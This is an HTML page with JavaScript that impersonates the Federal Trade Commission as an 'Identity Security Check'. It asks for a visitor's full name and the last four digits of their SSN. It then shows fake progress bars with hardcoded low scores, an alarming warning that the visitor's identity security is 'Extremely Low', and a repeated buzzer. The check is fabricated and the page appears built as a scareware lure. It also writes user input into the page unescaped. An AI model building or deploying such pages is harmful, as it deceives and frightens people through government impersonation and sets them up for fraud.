<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Federal Trade Commission - Identity Security Check</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            color: black;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 500px;
            margin: auto;
            padding: 20px;
            border: 1px solid #ccc;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            background-color: white;
        }
        .logo {
            width: 120px;
            margin-bottom: 20px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .button {
            width: 100%;
            padding: 12px;
            background: blue;
            color: white;
            border: none;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 10px;
        }
        .button:hover {
            background: darkblue;
        }
        .progress-container {
            width: 100%;
            background-color: #ddd;
            margin-top: 15px;
            border-radius: 5px;
            height: 20px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background-color: blue;
            border-radius: 5px;
            transition: width 1.5s;
        }
        .result {
            display: none;
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: red;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/8a/Federal_Trade_Commission_logo.svg" alt="FTC Logo" class="logo">
        <h2>Federal Trade Commission</h2>
        <h3>Identity Security Check</h3>

        <input type="text" id="name" placeholder="Enter Your Full Name" required>
        <input type="text" id="ssn" placeholder="Enter Last 4 Digits of SSN" maxlength="4" required>
        <button class="button" onclick="startSecurityCheck()">Check Security</button>

        <div id="loadingSection" style="display: none;">
            <p>Analyzing Security Levels...</p>

            <p>Passport Security: <span id="passportText">0%</span></p>
            <div class="progress-container"><div id="passportBar" class="progress-bar"></div></div>

            <p>Driver License Security: <span id="licenseText">0%</span></p>
            <div class="progress-container"><div id="licenseBar" class="progress-bar"></div></div>

            <p>IP Address Security: <span id="ipText">0%</span></p>
            <div class="progress-container"><div id="ipBar" class="progress-bar"></div></div>

            <p>Banking Security: <span id="bankText">0%</span></p>
            <div class="progress-container"><div id="bankBar" class="progress-bar"></div></div>
        </div>

        <div id="resultSection" class="result"></div>
    </div>

    <!-- Buzzer Sound -->
    <audio id="buzzer" src="https://www.soundjay.com/button/beep-07.wav"></audio>

    <script>
        function startSecurityCheck() {
            let name = document.getElementById("name").value;
            let ssn = document.getElementById("ssn").value;
            let buzzer = document.getElementById("buzzer");

            if (name === "" || ssn.length !== 4) {
                alert("Please enter your full name and last 4 digits of SSN.");
                return;
            }

            // User Interaction to Enable Audio Play
            buzzer.play().catch(() => console.log("Audio will play later"));

            document.getElementById("loadingSection").style.display = "block";
            document.getElementById("resultSection").style.display = "none";

            let securityLevels = [
                { id: "passport", value: 3 },
                { id: "license", value: 6 },
                { id: "ip", value: 21 },
                { id: "bank", value: 4 }
            ];

            let total = 0;
            let i = 0;

            function updateSecurity() {
                if (i < securityLevels.length) {
                    let bar = document.getElementById(securityLevels[i].id + "Bar");
                    let text = document.getElementById(securityLevels[i].id + "Text");
                    let value = securityLevels[i].value;

                    bar.style.width = value + "%";
                    text.innerText = value + "%";

                    total += value;
                    i++;
                    setTimeout(updateSecurity, 2500);
                } else {
                    showResults(name, ssn, total / securityLevels.length);
                }
            }

            updateSecurity();
        }

        function showResults(name, ssn, avgSecurity) {
            setTimeout(() => {
                let resultSection = document.getElementById("resultSection");
                resultSection.innerHTML = `
                    <p>Name: <span style="color: black;">${name}</span></p>
                    <p>Last 4 Digits of SSN: <span style="color: black;">${ssn}</span></p>
                    <p>Average Security Level: <span style="color: black;">${avgSecurity.toFixed(1)}%</span></p>
                    <p style="color: red;">⚠️ Your Identity Security is Extremely Low! ⚠️</p>
                `;
                resultSection.style.display = "block";

                playBuzzer();
            }, 2000);
        }

        function playBuzzer() {
            let buzzer = document.getElementById("buzzer");
            buzzer.play();
            setTimeout(() => buzzer.play(), 1000);
            setTimeout(() => buzzer.play(), 2000);
        }
    </script>

</body>
</html>
